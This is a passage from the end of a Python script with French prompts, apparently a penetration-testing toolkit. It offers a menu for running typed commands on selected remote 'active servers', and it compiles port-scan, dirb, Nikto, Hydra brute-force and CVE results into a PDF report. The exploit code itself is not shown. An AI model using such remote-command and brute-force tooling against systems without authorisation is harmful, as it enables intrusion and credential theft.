                            server_choice = input("\nEntrez le numéro du serveur auquel vous souhaitez vous connecter : ")
                            try:
                                server_index = int(server_choice) - 1
                                selected_server = active_servers[server_index]
                                ip, port = selected_server
                                command = input("\nEntrez la commande à exécuter : ")
                                output = execute_command(command, ip, port)
                                print("\nRésultat de la commande :")
                                print(output)
                            except ValueError:
                                print("\nNuméro de serveur invalide.")
                            except IndexError:
                                print("\nNuméro de serveur hors limites.")
                        elif choice == "4":
                            print("\nFin du programme.")
                            break
                        else:
                            print("\nOption invalide. Veuillez entrer un numéro valide.")
                    
                    

                elif choix_exploit == "3":
                    break  # Sortir du sous-menu et revenir au menu principal

                else:
                    print("Choix invalide. Veuillez saisir 1 à 3.")
        
        elif choix_outil == "5":
            result_folder = "Resultat"
            scan_port_file = os.path.join(result_folder, "Result_Scan_Port.txt")
            discovery_services_file = os.path.join(result_folder, "Result_Découverte_Services.txt")
            dirb_file = os.path.join(result_folder, "Result_Dirb.txt")
            nikto_file = os.path.join(result_folder, "Result_Nikto.txt")
            network_file =os.path.join(result_folder, "Result_Scan_Reseau.txt")
            hydra_usrmdp_file = os.path.join(result_folder, "Result_Hydra_UsrMdp.txt")
            hydra_identifiant_file = os.path.join(result_folder, "Result_Hydra_Identifiant.txt")
            hydra_mdp_file = os.path.join(result_folder, "Result_Hydra_Mdp.txt")
            hydra_connexion_file = os.path.join(result_folder, "Result_Hydra_Connexion.txt")
            cve_port_file = os.path.join(result_folder, "Result_CVE_Port.txt")
            cve_service_file = os.path.join(result_folder, "Result_CVE_Service.txt")
            cve_os_file = os.path.join(result_folder, "Result_CVE_OS.txt")

            output_pdf = input("Entrez le nom du rapport générale : ")

            hydra_usrmdp_data = extract_data_hydra_usrmdp(hydra_usrmdp_file)
            hydra_identifiant_data = extract_data_hydra_identifiant(hydra_identifiant_file)
            hydra_mdp_data = extract_data_hydra_mdp(hydra_mdp_file)
            hydra_connexion_data = extract_data_hydra_connexion(hydra_connexion_file)

            cve_port_data = extract_data_cve_port(cve_port_file)
            cve_service_data = extract_data_cve_service(cve_service_file)
            cve_os_data = extract_data_cve_os(cve_os_file)

            try:
                scan_port_data = extract_data_scan_port(scan_port_file)
            except FileNotFoundError:
                print("Le fichier Result_Scan_Port.txt est introuvable. Les données de scan de port seront manquantes.")
                scan_port_data = []

            try:
                discovery_services_data = extract_data_discovery_services(discovery_services_file)
            except FileNotFoundError:
                print("Le fichier Result_Découverte_Services.txt est introuvable. Les données de découverte de services seront manquantes.")
                discovery_services_data = []

            try:
                network_scan_data = extract_data_discovery_services(network_file)
            except FileNotFoundError:
                print("Le fichier Result_Découverte_Services.txt est introuvable. Les données de découverte de services seront manquantes.")
                network_scan_data = []

            dirb_data = extract_data_dirb(dirb_file)
            nikto_data = extract_data_nikto(nikto_file)

            create_pdf(scan_port_data, discovery_services_data, dirb_data, nikto_data, network_scan_data, hydra_usrmdp_data, hydra_identifiant_data, hydra_mdp_data, hydra_connexion_data, cve_port_data, cve_service_data, cve_os_data, output_pdf)
            print(f"Le document PDF '{output_pdf}' a été créé avec succès.")
                    
        elif choix_outil == "6":
            break  # Fermeture du programme

        else:
            print("Choix invalide. Veuillez saisir un nombre entre 1 et 6.")

# Appeler la fonction principale
if __name__ == "__main__":
    main()